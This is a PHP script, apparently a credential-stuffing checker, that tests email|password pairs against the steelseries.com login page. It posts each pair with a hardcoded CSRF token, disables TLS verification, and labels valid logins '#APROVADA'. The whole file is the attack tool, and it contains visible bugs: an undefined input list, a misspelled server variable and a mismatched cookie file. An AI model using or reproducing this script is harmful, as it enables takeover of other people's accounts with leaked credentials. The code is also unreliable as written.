<?php

session_start();

function getStr($string,$start,$end){
$str = explode($start,$string);
$str = explode($end,$str[1]);
return $str[0];}
{
$separador = "|";
$e = explode("\r\n", $lista);
$c = count($e);
for ($i=0; $i < $c; $i++) { 
$explode = explode($separador, $e[$i]);
Testar(trim($explode[0]),trim($explode[1]));}
}

function Testar($email,$senha){
if (file_exists(getcwd()."/cookies.txt")) {
unlink(getcwd()."/cookies.txt");}

$time = time();


//___________________________________//
// 1 LOGIN //

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://steelseries.com/login');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: https://steelseries.com',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Dest: document',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://steelseries.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'X-Requested-With: XMLHttpRequest',
    'referer: https://steelseries.com/login'));

curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_USERAGENT, $_Server['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrfmiddlewaretoken=mkO9zqTus5kbPHx3dB76LoRkvBQErOsBoP09RroDZmbGu7xcnHsUTYSGBo8ygnbL&next=&email='.$email.'&password='.$senha.'');
$data1 = curl_exec($ch);


if (strpos($data1, 'https://br.steelseries.com/dashboard')){
exit('#APROVADA '.$email.'|'.$senha.'/');}



else if (strpos($data1, 'Invalid password')){
exit('<b><span class="badge badge-success">#Reprovada > </span> '.$email.'|'.$senha.'| #Clyde');}

else{
exit('<b><span class="badge badge-danger">#Aprovada</span> ➜ '.$email.'|'.$senha.' ➜ <span class="badge badge-white">Desconhecido</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}